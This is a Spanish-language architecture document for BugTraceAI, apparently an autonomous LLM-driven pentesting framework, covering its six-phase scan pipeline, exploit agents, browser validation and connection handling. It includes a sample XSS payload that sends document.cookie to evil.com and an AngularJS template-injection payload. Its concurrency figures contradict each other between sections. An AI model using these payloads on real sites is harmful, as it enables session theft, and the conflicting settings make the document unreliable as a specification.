# BugTraceAI Architecture V6 - Sequential Pipeline

**Fecha**: 2026-02-02
**Versión**: 3.1.2 (Robust Payload Format - V6 Pipeline)
**Motor**: Sequential Phase Architecture con Event-Driven Coordination

---

## Overview

BugTraceAI es un framework de pruebas de seguridad ofensiva (Pentesting) diseñado para operar de forma autónoma. A diferencia de los escáneres lineales tradicionales (vuln scan → report), BugTraceAI opera con un **pipeline estrictamente secuencial de 6 fases** donde cada fase termina completamente antes de que empiece la siguiente.

El núcleo del sistema es el **Sequential Pipeline V6**, un motor orquestador que coordina el flujo de trabajo a través de **6 fases desacopladas**, asegurando que la inteligencia obtenida en una fase (ej. descubrimiento de una API) se utilice estratégicamente en la siguiente (ej. selección del agente JWT).

**Filosofía del Diseño**: **Secuencial entre fases, paralelo dentro de fases**
- ✅ Cada fase espera señal de completitud de la anterior (`signal_phase_complete()`)
- ✅ Dentro de cada fase, operaciones paralelas masivas (50 DAST workers, 100 specialists)
- ✅ Auditoría y debugging simplificados (errores confinados a fase específica)
- ✅ Archivos JSON persisten estado completo entre fases (divide y vencerás)

---

## Pipeline de 6 Fases

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      BUGTRACE REACTOR V6 PIPELINE                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  PHASE 1: RECONNAISSANCE                 Concurrency: 10 workers (legacy)   │
│  ┌──────────────────┐                                                        │
│  │ GoSpider Agent   │ → DNS enum + spidering pasivo                         │
│  │ TechStack Detect │ → Framework detection (Wappalyzer-like)               │
│  │ Endpoint Enum    │ → API schema discovery                                │
│  └────────┬─────────┘                                                        │
│           │  Output: urls.txt, Subdominios, Tech Stack                      │
│           ▼                                                                  │
│  PHASE 2: DISCOVERY                      Concurrency: 1 worker (GoSpider)   │
│  ┌──────────────────┐                    + 5 workers (DAST Analysis)        │
│  │ GoSpider Agent   │ → Spidering single-threaded (by design)               │
│  │ DASTySAST Agent  │ → Análisis DAST/SAST per URL (5 paralelo)             │
│  │ Reflection Detect│ → Detección de reflexiones (echo patterns)            │
│  └────────┬─────────┘                                                        │
│           │  Output: dastysast/*.json (análisis numerados)                  │
│           ▼                                                                  │
│  PHASE 3: STRATEGY                       Concurrency: 1 worker (CPU)        │
│  ┌──────────────────┐                                                        │
│  │ ThinkingConsol.  │ → Lee dastysast/*.json (BATCH)                        │
│  │ Agent            │ → Deduplicación (500 findings → 50 tareas)            │
│  │                  │ → Correlación (patrones React → XSS DOM)              │
│  │                  │ → Priorización (CVSS estimado)                         │
│  └────────┬─────────┘                                                        │
│           │  Output: work_queued_* events (colas de specialists)            │
│           ▼                                                                  │
│  PHASE 4: EXPLOITATION                   Concurrency: 10 workers            │
│  ┌──────────────────┐                    (limitado por pool HTTP: 50)       │
│  │  Swarm of 11+    │ → XSSAgent (CWE-79, Playwright)                       │
│  │   Specialists    │ → SQLiAgent (CWE-89, SQLMap authoritative)            │
│  │                  │ → RCEAgent (CWE-78), SSRFAgent (CWE-918)               │
│  │                  │ → LFIAgent, XXEAgent, IDORAgent, JWTAgent...           │
│  └────────┬─────────┘                                                        │
│           │  Output: Preliminary Findings (CONFIRMED/REQUIRES_VALIDATION)   │
│           ▼                                                                  │
│  PHASE 5: VALIDATION                     Concurrency: 1 worker (CDP)        │
│  ┌──────────────────┐                    ⚠️ HARDCODED - NO CAMBIAR         │
│  │ AgenticValidator │ → CDP (Chrome DevTools Protocol)                      │
│  │  (XSS + CSTI)    │ → Single Chrome process, single WebSocket             │
│  │                  │ → Vision AI verification (Gemini 2.5 Flash)           │
│  │                  │ → TIMEOUT: 45s por finding                             │
│  │                  │ → ⚠️ SOLO valida XSS (CWE-79) y CSTI (CWE-94)         │
│  │                  │ → Otras vulns ya validadas en Fase 4 (specialists)    │
│  └────────┬─────────┘                                                        │
│           │  Output: Confirmed Findings (JSON con evidencia visual)         │
│           ▼                                                                  │
│  PHASE 6: REPORTING                      Concurrency: 1 worker              │
│  ┌──────────────────┐                                                        │
│  │ ReportGenerator  │ → Enriquecimiento (CWE, CVSS v3.1)                    │
│  │ CVSS Calculator  │ → Generación multi-formato (JSON, HTML, MD)           │
│  │ Enrichment Engine│ → Remediation suggestions                             │
│  └────────┬─────────┘                                                        │
│           │                                                                  │
│           ▼                                                                  │
│  ┌──────────────────┐                                                        │
│  │  Final Report    │ → final_report.html, .json, .md                       │
│  └──────────────────┘                                                        │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘

LIMITACIONES HTTP (http_orchestrator.py):
- DestinationType.TARGET pool_size = 50 (máximo conexiones concurrentes al target)
- ConnectionLifecycleTracker bloquea si ghost_count >= 5 (backpressure)
- ANALYSIS (5) + SPECIALISTS (10) = 15 total (30% del pool - margen seguro)
```

---

## Componentes Principales

### 1. El Reactor (Orquestador)

**Archivo**: `bugtrace/core/reactor.py`

El sistema nervioso central. No ejecuta ataques, sino que *despacha* órdenes.

- **EventBus**: Sistema de mensajería asíncrona. Los agentes publican hallazgos (`finding_confirmed`) y el Reactor decide qué hacer.
- **PhaseController**: Controla la concurrencia con semáforos para no saturar al objetivo ni a la máquina local.
- **StateManager**: Persistencia de estado en SQLite para recuperación ante fallos.

### 2. El Enjambre de Especialistas (The Swarm)

**Directorio**: `bugtrace/agents/exploitation/`

Conjunto de **11+ agentes**, cada uno experto en una clase de vulnerabilidad (CWE).

No son scripts genéricos; son clases Python complejas con lógica de "Hunter" (búsqueda) y "Auditor" (validación).

| Agente | Archivo | CWE | Herramienta |
|--------|---------|-----|-------------|
| XSSAgent | `xss_agent.py` | CWE-79 | Playwright |
| SQLiAgent | `sqli_agent.py` | CWE-89 | SQLMap |
| RCEAgent | `rce_agent.py` | CWE-78 | Payloads custom |
| SSRFAgent | `ssrf_agent.py` | CWE-918 | HTTP probing |
| LFIAgent | `lfi_agent.py` | CWE-22 | Path traversal |
| XXEAgent | `xxe_agent.py` | CWE-611 | XML parsing |
| IDORAgent | `idor_agent.py` | CWE-639 | Object fuzzing |
| JWTAgent | `jwt_agent.py` | CWE-287 | JWT manipulation |
| CSTIAgent | `csti_agent.py` | CWE-94 | Template injection |
| OpenRedirectAgent | `open_redirect_agent.py` | CWE-601 | URL validation |
| PrototypePollutionAgent | `prototype_pollution_agent.py` | CWE-1321 | JS pollution |

**Ejemplo**: `XSSAgent` sabe diferenciar un reflejo en HTML de uno en JS string, y genera payloads context-aware.

### 3. La Tríada de Validación

Mecanismo de triple capa para eliminar falsos positivos (objetivo: **0% FP**).

1. **Validación HTTP**: Análisis de respuesta estática (rápido)
   - Archivo: `bugtrace/validators/http_validator.py`
   - Tiempo: ~100ms por finding
   
2. **Validación Browser (CDP)**: Ejecución real en Chrome headless para confirmar XSS/DOM
   - Archivo: `bugtrace/agents/agentic_validator.py`
   - Concurrencia: 5 workers (limitado por CDP multi-context)
   - Tiempo: ~5-15s por finding
   
3. **Validación Visión AI**: Un modelo LLM analiza la captura de pantalla para confirmar el impacto visual
   - Archivo: `bugtrace/validators/vision_analyzer.py`
   - Modelo: Gemini 2.5 Flash (Vision)
   - Timeout: 45s por análisis

---

## Phase Semaphores (Concurrencia Granular)

### Archivo: `bugtrace/core/phase_semaphores.py`

Cada fase tiene su propio semáforo independiente:

```python
# Configuración real del código (phase_semaphores.py:68-76)
PHASE_SEMAPHORES = {
    ScanPhase.DISCOVERY:      Semaphore(1),    # GoSpider single-threaded by design
    ScanPhase.ANALYSIS:       Semaphore(5),    # DAST/SAST per URL
    ScanPhase.EXPLOITATION:   Semaphore(10),   # SQLi, XSS, CSTI paralelos
    ScanPhase.VALIDATION:     Semaphore(1),    # HARDCODED - CDP single-session limitation
    ScanPhase.REPORTING:      Semaphore(1),    # Single-threaded (generación)

    # Semáforo global para rate limiting LLM
    LLM_GLOBAL:               Semaphore(1),    # OpenRouter rate limit (config.MAX_CONCURRENT_REQUESTS)
}
```

### Configuración Real (`config.py:750-755`)

```python
# bugtrace/core/config.py - Valores actuales
MAX_CONCURRENT_DISCOVERY: int = 1       # GoSpider (single-threaded by design)
MAX_CONCURRENT_ANALYSIS: int = 5        # DAST/SAST per URL
MAX_CONCURRENT_SPECIALISTS: int = 10    # SQLi, XSS, CSTI paralelos
MAX_CONCURRENT_VALIDATION: int = 1      # DO NOT CHANGE - CDP limitation
MAX_CONCURRENT_REQUESTS: int = 1        # LLM API rate limiting
```

### Limitaciones de Concurrencia HTTP (HTTPOrchestrator)

**Archivo**: `bugtrace/core/http_orchestrator.py:565-582`

El sistema está limitado por el **pool_size** del `DestinationType.TARGET`:

```python
DestinationType.TARGET: DestinationConfig(
    timeout=TimeoutConfig(total=30.0),
    retry=RetryPolicy(max_retries=1),    # Don't hammer targets
    pool_size=50,                         # ← LÍMITE REAL de conexiones concurrentes
    keepalive=0,                          # No keepalive for hostile targets
)
```

**ConnectionLifecycleTracker** (líneas 320-512) previene saturación:
- Detecta "ghost connections" (requests que no cierran)
- Bloquea nuevas requests si `ghost_count >= 5`
- Marca como ghost si no cierra en 120 segundos
- Todas las requests tienen `finally: register_close(request_id)` garantizado

**Valores seguros recomendados:**
```python
# Total: ANALYSIS + SPECIALISTS ≤ 50 (pool_size TARGET)
MAX_CONCURRENT_ANALYSIS: int = 20       # 40% del pool
MAX_CONCURRENT_SPECIALISTS: int = 30    # 60% del pool
MAX_CONCURRENT_VALIDATION: int = 1      # NO CAMBIAR - single Chrome process
```

### Por qué Validation = 1 (HARDCODED)

**CDP (Chrome DevTools Protocol) es single-session en la implementación actual:**

```python
# cdp_client.py:46-81
class CDPClient:
    def __init__(self, headless: bool = True, port: int = 9222):
        self.chrome_process: Optional[subprocess.Popen] = None
        self.ws_url: Optional[str] = None
        self.ws: Optional[aiohttp.ClientWebSocketResponse] = None  # ← SINGLE WebSocket
```

**Limitaciones técnicas:**
1. **Un solo proceso Chrome** con un puerto (9222)
2. **Un solo WebSocket connection** - no hay pool de conexiones
3. **No hay multi-context** en la implementación - compartirían el mismo Chrome
4. `alert()` popups bloquean el proceso entero (timeout 45s)

**CDP vs Playwright:**

| Aspecto | CDP (Actual) | Playwright |
|---------|--------------|------------|
| Concurrencia | **1** (single-session) | N (multi-browser) |
| Implementación | 1 Chrome process, 1 WebSocket | N Chrome instances |
| Precisión XSS | Alta (detecta sin popup) | Media |
| `alert()` handling | Bloquea proceso completo | Cada browser independiente |
| Uso | AgenticValidator | XSSAgent (Fase 4) |
| Overhead | Bajo (1 Chrome) | Alto (N Chrome instances) |

**Estrategia:** Filtrar agresivamente en Fase 4 (specialists) ANTES de validación para minimizar findings que llegan a CDP.

---

## HTTPOrchestrator - Sistema de Ghost Connections

### Archivo: `bugtrace/core/http_orchestrator.py`

El HTTPOrchestrator es una capa de gestión HTTP production-grade que previene saturación del sistema mediante **detección de conexiones fantasma** y **backpressure automático**.

### Problema: Conexiones que no se cierran

En scans agresivos, es común abrir muchas conexiones HTTP pero **no cerrarlas correctamente**:
- Conexiones en estado `CLOSE_WAIT` indefinidamente
- Agotamiento de file descriptors
- Memory leaks en buffers TCP
- Saturation del servidor objetivo

**Este era tu problema**: "abrir muchas peticiones HTTP y eso satura porque abre pero no controla las que cierra".

### Solución: ConnectionLifecycleTracker

**Archivo**: `http_orchestrator.py:320-512`

```python
class ConnectionLifecycleTracker:
    """
    Tracks connection lifecycle to detect ghost connections.

    Ghost connections are requests that:
    - Were opened but never closed
    - Took too long to close (stuck in CLOSE_WAIT)

    This tracker implements backpressure: if too many ghosts exist,
    new connections are blocked until ghosts are cleaned up.
    """

    GHOST_THRESHOLD_SECONDS = 120.0  # Connection becomes ghost after 2 min
    MAX_GHOSTS_BEFORE_BLOCK = 5      # Block new requests if this many ghosts
    CLEANUP_INTERVAL = 30.0          # Check for ghosts every 30s
```

### Flujo de Tracking

```
Request iniciado
│
├─ register_open(request_id, host, destination)
│   └─ self._total_opened += 1
│   └─ Check: ghost_count >= 5? → BLOCK request (ConnectionBlockedError)
│
├─ Ejecutar request HTTP
│   └─ aiohttp.ClientSession.request(...)
│
└─ finally:
    └─ register_close(request_id)  # ← SIEMPRE se ejecuta
        └─ self._total_closed += 1
        └─ conn.state = CLOSED
```

**Garantía**: Línea 1096-1098 del `DestinationClient.request()`:
```python
finally:
    # CRITICAL: Always register connection close
    await connection_lifecycle.register_close(request_id)
```

### Detección de Ghosts (Background Loop)

Cada 30 segundos, el `_cleanup_loop()` escanea todas las conexiones:

```python
async def _detect_ghosts(self):
    for req_id, conn in self._connections.items():
        if conn.state == ACTIVE:
            age = now - conn.opened_at
            if age > 120.0:  # 2 minutos sin cerrar
                conn.state = GHOST
                self._ghost_count += 1
                logger.warning(f"GHOST detected: {conn.host} (age={age:.1f}s)")
```

### Backpressure Automático

Si `ghost_count >= 5`:
```python
def can_open_connection(self) -> Tuple[bool, str]:
    if self._ghost_count >= self.MAX_GHOSTS_BEFORE_BLOCK:
        self._blocked_requests += 1
        return False, f"Too many ghost connections ({self._ghost_count})"
    return True, ""
```

**Resultado**: Nuevas requests se bloquean hasta que los ghosts se limpien.

### Estadísticas de Lifecycle

```python
connection_lifecycle.get_stats()
# Output:
{
    "active_connections": 12,
    "ghost_connections": 2,
    "total_opened": 1543,
    "total_closed": 1529,
    "total_ghosts_detected": 8,
    "blocked_requests": 3,
    "close_rate": 99.09%,       # ← Debería estar > 98%
    "ghost_rate": 0.52%         # ← Debería estar < 2%
}
```

### Adaptive Retry Calculator

**Archivo**: `http_orchestrator.py:135-279`

El sistema también ajusta dinámicamente el número de reintentos basándose en métricas reales:

```python
class AdaptiveRetryCalculator:
    """
    Calculates optimal retry count based on real-time metrics.

    Adapts retry behavior based on:
    - Host success rate (historical performance)
    - Response latency (slow servers get fewer retries)
    - Circuit breaker state (half-open = minimal retries)
    - System load (backpressure reduces retries)
    """
```

**Reglas adaptativas:**
- Success rate > 95% → max 1 retry
- Success rate < 50% → 0 retries (don't waste time)
- P95 latency > 10s → max 1 retry (server muy lento)
- Circuit breaker OPEN → 0 retries
- System load > 80% → reduce retries (backpressure)

### Pool Limits por Destination

```python
# http_orchestrator.py:544-619
DESTINATION_CONFIGS = {
    DestinationType.LLM: DestinationConfig(
        pool_size=5,        # LLM APIs - bajo volumen, alta prioridad
        keepalive=60.0,
    ),
    DestinationType.TARGET: DestinationConfig(
        pool_size=50,       # ← LÍMITE CRÍTICO para scans
        keepalive=0,        # No keepalive (targets hostiles)
    ),
    DestinationType.SERVICE: DestinationConfig(
        pool_size=10,       # Servicios internos (Interarsh, Manipulator)
    ),
    DestinationType.PROBE: DestinationConfig(
        pool_size=30,       # Probes rápidos (callbacks, OOB)
    ),
}
```

**Implicación**: Si `MAX_CONCURRENT_ANALYSIS = 50`, estarías usando el 100% del pool TARGET. Por eso se recomienda `ANALYSIS=20` + `SPECIALISTS=30` = 50 total con margen para ghosts.

### Ventajas del Sistema

✅ **Prevención de saturación**: Backpressure automático si hay ghosts
✅ **Garantía de cierre**: `finally: register_close()` en todas las requests
✅ **Visibilidad**: Métricas detalladas de conexiones activas/ghosts
✅ **Adaptive retry**: Menos reintentos en servers lentos/fallidos
✅ **Circuit breaker**: Per-host, evita hammering endpoints muertos
✅ **Health monitoring**: Detecta y recrea sesiones zombie

### Monitoreo

Para ver el estado actual del sistema:
```python
from bugtrace.core.http_orchestrator import orchestrator, connection_lifecycle

# Health report completo
health = orchestrator.get_health_report()
print(health["connection_lifecycle"])  # Stats de lifecycle
print(health["active_connections"])     # Conexiones activas ahora
print(health["adaptive_retry"])         # Métricas de retry adaptativo

# Solo lifecycle
stats = connection_lifecycle.get_stats()
print(f"Close rate: {stats['close_rate']:.2f}%")
print(f"Ghost rate: {stats['ghost_rate']:.2f}%")
```

---

## ThinkingConsolidationAgent

### Archivo: `bugtrace/agents/strategy/thinking_consolidation_agent.py`

Cerebro del pipeline que recibe findings de Discovery y decide qué pasa a los specialists.

### Flujo de Procesamiento

```
Finding recibido (Suspected Vector)
       │
       ▼
┌──────────────────┐
│ 1. Classify      │ → Determina specialist (xss, sqli, csti, etc.)
│                  │ → Analiza parámetro, contexto, reflexión
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ 2. FP Filter     │ → fp_confidence < 0.5 → FILTERED
│                  │ → EXCEPTO: SQLi (SQLMap es authoritative)
└────────┬─────────┘ → EXCEPTO: probe_validated=True (ya confirmado)
         │
         ▼
┌──────────────────┐
│ 3. Deduplication │ → key = (vuln_type:param:path_pattern)
│                  │ → 50 URLs con ?id= → 1 tarea única
└────────┬─────────┘ → Duplicado → FILTERED
         │
         ▼
┌──────────────────┐
│ 4. Correlation   │ → Detecta patrones (ej: "Todo usa React")
│                  │ → Ajusta prioridad (React → XSS DOM)
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ 5. Priority Queue│ → Score = confidence × severity × exploitability
│                  │ → Ordena por impacto en Bug Bounty
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ 6. Emit Event    │ → work_queued_xss (para XSSAgent)
│                  │ → work_queued_sqli (para SQLiAgent)
└──────────────────┘ → etc...
```

### SQLi Bypass del Filtro FP

```python
# thinking_consolidation_agent.py línea ~420
if not is_sqli and not is_probe_validated and fp_confidence < threshold:
    # FILTERED - no pasa a specialists
    logger.info(f"Finding filtered by FP threshold: {finding['id']}")
    return

if is_sqli and fp_confidence < threshold:
    logger.info("SQLi bypass: forwarded to SQLMap for authoritative validation")
    # PASA - SQLMap es determinístico, decide él
```

**Razón:** SQLMap es authoritative y determinístico. Un LLM puede equivocarse con SQL injection, pero SQLMap confirma con payloads reales (time-based, boolean-based, etc.).

### probe_validated Bypass

Findings con `probe_validated=True` bypasean el filtro FP porque ya fueron confirmados por una herramienta externa (ej: XSSAgent con Playwright ejecutó el XSS y capturó un `alert()`).

---

## Specialist Agents (Fase 4)

### XSSAgent

**Archivo**: `bugtrace/agents/exploitation/xss_agent.py`

- **Pipeline de 4 niveles**:
  1. HTTP Static Analysis (regex, reflection detection)
  2. AI-Assisted Manipulation (LLM genera payloads context-aware)
  3. Playwright Validation (ejecución en navegador real)
  4. CDP Deep Validation (para casos complejos de DOM XSS)
  
- Usa **Playwright** (multi-threaded OK)
- Genera payloads context-aware (HTML, JS string, attribute, etc.)
- Confirma con ejecución real en browser
- Findings confirmados → `probe_validated=True`
- **Ver**: `technical_specs/XSS_PIPELINE_VALIDATION.md`

### SQLiAgent

**Archivo**: `bugtrace/agents/exploitation/sqli_agent.py`

- Usa **SQLMap** (herramienta externa authoritative)
- Bypasea filtro FP de ThinkingConsolidation
- SQLMap es determinístico → si confirma, es SQLi real
- Soporta WAF bypass strategies (--tamper)
- Detecta: Time-based, Boolean-based, Error-based, UNION-based

### RCEAgent

**Archivo**: `bugtrace/agents/exploitation/rce_agent.py`

- Remote Code Execution
- Payloads: Command injection, SSTI, Expression Language
- Detecta ejecución con canary tokens (ej: `whoami` → response contains username)

### SSRFAgent

**Archivo**: `bugtrace/agents/exploitation/ssrf_agent.py`

- Server-Side Request Forgery
- Usa servidor de callback propio (`http://callback.bugtrace.internal/`)
- Detecta: DNS exfiltration, HTTP callback, cloud metadata access

---

## AgenticValidator (CDP) - Solo Client-Side

### Archivo: `bugtrace/agents/validation/agentic_validator.py`

**⚠️ IMPORTANTE**: AgenticValidator **SOLO valida vulnerabilidades client-side**:
- ✅ **XSS (Cross-Site Scripting)** - CWE-79
- ✅ **CSTI (Client-Side Template Injection)** - CWE-94

**NO valida** (ya validadas por otros métodos):
- ❌ **SQLi** → Validado por SQLMap (authoritative)
- ❌ **RCE** → Validado por análisis de respuesta HTTP (canary tokens)
- ❌ **SSRF** → Validado por callback server
- ❌ **LFI** → Validado por contenido de respuesta
- ❌ **XXE** → Validado por análisis de respuesta XML
- ❌ **IDOR** → Validado por código de estado HTTP/contenido
- ❌ **JWT** → Validado por verificación de firma/claims
- ❌ **Open Redirect** → Validado por header `Location`
- ❌ **Prototype Pollution** → Validado por análisis de heap (aunque CDP puede hacerlo)

**Razón**: Solo las vulnerabilidades **client-side** requieren ejecución de JavaScript en navegador real y las capacidades avanzadas de CDP (Console API, DOM Debugger, Network Interception). Las demás se validan con análisis HTTP estático, que es **~100x más rápido**.

---

### CDP vs Playwright: Por Qué CDP para XSS/CSTI

**Chrome DevTools Protocol (CDP)** permite capacidades que Playwright **no puede** hacer:

| Capacidad | CDP | Playwright | Por Qué Importa para XSS/CSTI |
|-----------|-----|------------|-------------------------------|
| **DOM Mutation Observer** | `DOMDebugger.setDOMBreakpoint()` | ⚠️ Limitado | Detecta XSS DOM **sin `alert()`** |
| **Console API Override** | `Runtime.addBinding()` | ❌ No | Captura `console.log()` sin UI visible |
| **Runtime Context Execution** | `Runtime.evaluate(contextId=X)` | `evaluate()` (global) | Ejecuta CSTI en contexto de framework (AngularJS) |
| **JavaScript Debugger** | `Debugger.setBreakpoint()` | ❌ No | Rastrea ejecución paso a paso del payload |
| **Network Interception** | `Network.setRequestInterception()` | `route()` (alto nivel) | Detecta exfiltración silenciosa (`fetch()`) |
| **Security Events** | `Security.securityStateChanged` | ❌ No | Detecta bypass de CSP |
| **Heap Snapshots** | `HeapProfiler.takeHeapSnapshot()` | ❌ No | Detecta Prototype Pollution en memoria |

#### Ejemplos Concretos

**1. XSS DOM sin `alert()`**
```javascript
// Payload: <img src=x onerror=fetch('http://evil.com?c='+document.cookie)>
```
- **Playwright**: ❌ No detecta (no hay `alert()` bloqueante)
- **CDP**: ✅ Detecta vía `Network.requestWillBeSent` → ve request a `evil.com`

**2. CSTI en AngularJS**
```javascript
// Payload: {{constructor.constructor('alert(1)')()}}
```
- **Playwright**: ⚠️ Solo si `alert()` se ejecuta
- **CDP**: ✅ Ejecuta con `Runtime.evaluate()` en contexto de AngularJS + ve `Debugger.scriptParsed`

**3. XSS en Shadow DOM**
```html
<!-- Payload dentro de Web Component shadow root -->
```
- **Playwright**: ⚠️ Shadow DOM limitadamente accesible
- **CDP**: ✅ `DOM.getDocument(pierce: true)` → navega shadow DOM completo

---

### Características del Validador

- **Multi-context** (hasta 5 workers con CDP contexts independientes)
- **Timeout 45s** por finding (evita hang en `alert()`)
- **Vision AI** para verificación visual (Gemini 2.5 Flash) cuando no hay eventos técnicos
- **Solo procesa alta confianza** (confidence > 0.7)

### Workflow de Validación

```
Finding (REQUIRES_VALIDATION)
│ Solo si: vuln_type IN ['XSS', 'CSTI']
│
▼
┌──────────────────┐
│ 1. Launch CDP    │ → Chrome headless con --remote-debugging-port=9222
│    Connection    │ → Enable: Page, Network, Runtime, Console, DOMDebugger, Security
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│ 2. Setup Event   │ → Runtime.consoleAPICalled (console.log/error)
│    Listeners     │ → Page.javascriptDialogOpening (alert/confirm/prompt)
│                  │ → Network.requestWillBeSent (exfiltration)
└────────┬─────────┘ → DOMDebugger.setDOMBreakpoint (mutaciones DOM)
         │           → Security.securityStateChanged (CSP violations)
         ▼
┌──────────────────┐
│ 3. Navigate +    │ → Page.navigate(url_with_payload)
│    Inject Payload│ → Timeout: 45s (evita hang en alert)
└────────┬─────────┘ → Esperar Page.loadEventFired
         │
         ▼
┌──────────────────┐
│ 4. Monitor       │ CASO A: alert() → javascriptDialogOpening → ✅ CONFIRMED
│    Execution     │ CASO B: console.log() → consoleAPICalled → ✅ CONFIRMED
│    (45s max)     │ CASO C: fetch() → requestWillBeSent → ✅ CONFIRMED
└────────┬─────────┘ CASO D: DOM mutation → breakpoint → Screenshot needed
         │
         ▼
┌──────────────────┐
│ 5. Screenshot    │ → Page.captureScreenshot (before/after)
│    Capture       │ → Guardar evidence/{finding_id}_before.png
└────────┬─────────┘ → Guardar evidence/{finding_id}_after.png
         │
         ▼
┌──────────────────┐
│ 6. Vision AI     │ → Solo si no hay eventos técnicos claros
│    Analysis      │ → Gemini 2.5 Flash: "¿Impacto visual del XSS?"
└────────┬─────────┘ → {"confirmed": true/false, "evidence": "..."}
         │
         ▼
┌──────────────────┐
│ 7. Verdict +     │ → CONFIRMED: adjuntar screenshot, console logs, network traces
│    Evidence      │ → FALSE_POSITIVE: logs de depuración
└──────────────────┘
```

### Configuración CDP

```yaml
validation:
  # Solo XSS y CSTI
  enabled_vulnerability_types:
    - XSS
    - CSTI
  
  cdp:
    enabled: true
    port: 9222
    timeout: 45.0                        # Timeout por finding
    max_concurrent_contexts: 5           # Max 5 validaciones en paralelo
    
    enable_domains:
      - Page
      - Network
      - Runtime
      - Console
      - DOMDebugger
      - Security
      - HeapProfiler                     # Para Prototype Pollution (futuro)
  
  vision_ai:
    enabled: true
    model: "google/gemini-2.5-flash"
    confidence_threshold: 0.8
```

---

## Event System

El pipeline usa eventos para comunicación entre agentes:

```python
# Eventos principales (bugtrace/core/event_bus.py)

# Fase 1: Reconnaissance
subdomain_discovered
endpoint_discovered
tech_stack_detected

# Fase 2: Discovery
url_crawled
parameter_detected
reflection_found

# Fase 3: Strategy
suspected_vector_received      # Input del Thinking Agent
work_queued_xss               # Output a XSSAgent
work_queued_sqli              # Output a SQLiAgent
# ... work_queued_{specialist}

# Fase 4: Exploitation
finding_confirmed             # Specialist confirma vulnerabilidad
finding_requires_validation   # Specialist pide validación CDP

# Fase 5: Validation
validation_queued
validation_complete

# Fase 6: Reporting
report_generation_started
report_completed
```

---

## Configuración Crítica

### Archivo: `config/bugtrace.yaml`

```yaml
# ===========================
# SCAN CONFIGURATION
# ===========================
scan:
  max_urls: 1000                         # Límite de URLs a escanear
  max_concurrent_reconnaissance: 10       # Workers Fase 1
  max_concurrent_discovery: 50            # Workers Fase 2
  max_concurrent_specialists: 100         # Workers Fase 4
  max_concurrent_validation: 5            # Workers Fase 5 (CDP)
  
  # Filtros
  exclude_extensions:
    - .jpg
    - .png
    - .css
    - .woff2
  
  scope_domains:
    - example.com
    - "*.example.com"

# ===========================
# THINKING AGENT
# ===========================
thinking:
  fp_threshold: 0.5                      # Umbral para filtro FP
  dedup_enabled: true                    # Deduplicación activa
  correlation_enabled: true              # Análisis de patrones
  priority_by_cvss: true                 # Ordenar por CVSS estimado

# ===========================
# SPECIALIST AGENTS
# ===========================
specialists:
  xss:
    enabled: true
    playwright_headless: true
    timeout: 30
  
  sqli:
    enabled: true
    use_sqlmap: true
    sqlmap_timeout: 60
    mandatory_validation: true           # SQLi SIEMPRE usa SQLMap
  
  rce:
    enabled: true
    canary_token: "bugtrace_rce_{{uuid}}"
  
  ssrf:
    enabled: true
    callback_server: "https://callback.bugtrace.internal"

# ===========================
# VALIDATION
# ===========================
validation:
  cdp_enabled: true
  cdp_timeout: 45.0                      # Timeout por finding
  cdp_max_contexts: 5                    # Máximo 5 contexts simultáneos
  
  vision_ai:
    enabled: true
    model: "gemini-2.5-flash"
    confidence_threshold: 0.8

# ===========================
# LLM CONFIGURATION
# ===========================
llm:
  provider: "openrouter"
  max_concurrent_requests: 2             # Rate limiting
  timeout: 30
  
  models:
    analysis: "anthropic/claude-3.5-sonnet"
    vision: "google/gemini-2.5-flash"
    fast: "deepseek/deepseek-r1"

# ===========================
# REPORTING
# ===========================
reporting:
  formats:
    - json
    - html
    - markdown
  
  include_screenshots: true
  cvss_version: "3.1"
  enrichment_enabled: true
```

---

## Métricas y Debugging

### Parallelization Metrics

**Archivo**: `bugtrace/core/metrics/parallelization_metrics.py`

```python
# Ejemplo de output en logs
{
    "timestamp": "2026-02-01T15:30:00",
    "by_phase": {
        "reconnaissance": {"current": 7, "peak": 10, "total_processed": 45},
        "discovery": {"current": 42, "peak": 50, "total_processed": 850},
        "strategy": {"current": 1, "peak": 1, "total_processed": 850},
        "exploitation": {"current": 78, "peak": 100, "total_processed": 320},
        "validation": {"current": 3, "peak": 5, "total_processed": 12},
        "reporting": {"current": 0, "peak": 1, "total_processed": 1}
    },
    "llm_requests": {"current": 2, "peak": 2, "total": 1250}
}
```

### Dedup Metrics

**Archivo**: `bugtrace/core/metrics/dedup_metrics.py`

```python
{
    "timestamp": "2026-02-01T15:30:00",
    "received": 850,                      # Suspected vectors de Discovery
    "duplicates_eliminated": 420,         # Deduplicados por (type:param:path)
    "fp_filtered": 180,                   # Filtrados por FP < 0.5
    "passed_to_specialists": 250,         # Enviados a Fase 4
    
    "by_specialist": {
        "xss": 80,
        "sqli": 60,
        "idor": 40,
        "open_redirect": 30,
        "others": 40
    }
}
```

---

## Archivos Clave del Proyecto

| Archivo | Responsabilidad | LoC |
|---------|-----------------|-----|
| `core/reactor.py` | Orquestador principal del pipeline | ~800 |
| `core/event_bus.py` | Sistema de eventos asíncrono | ~200 |
| `core/phase_controller.py` | Control de semáforos por fase | ~150 |
| `core/state_manager.py` | Persistencia SQLite | ~300 |
| `agents/strategy/thinking_consolidation_agent.py` | Filtrado y routing (Fase 3) | ~600 |
| `agents/exploitation/xss_agent.py` | XSS specialist | ~500 |
| `agents/exploitation/sqli_agent.py` | SQLi specialist (SQLMap wrapper) | ~400 |
| `agents/validation/agentic_validator.py` | Validación CDP (Fase 5) | ~700 |
| `validators/http_validator.py` | Validación HTTP rápida | ~200 |
| `validators/vision_analyzer.py` | Análisis visual con Gemini | ~150 |
| `core/cdp/cdp_client.py` | Cliente Chrome DevTools Protocol | ~400 |

**Total Proyecto**: ~15,000 LoC (Python)

---

## Tecnologías Clave

- **Lenguaje**: Python 3.10+ (AsyncIO nativo)
- **Control Browser**: 
  - Playwright (para specialists multi-threaded)
  - Chrome DevTools Protocol (para validación CDP)
- **IA**: 
  - Modelos LLM vía OpenRouter
  - Claude 3.5 Sonnet (análisis profundo)
  - Gemini 2.5 Flash (visión + velocidad)
  - DeepSeek R1 (razonamiento)
- **Base de Datos**: SQLite (local) con persistencia de estado de escaneo
- **Concurrencia**: AsyncIO + Threading (híbrido)
- **Testing**: pytest con coverage > 80%

---

## Changelog desde V5

### Nuevas Features en V6

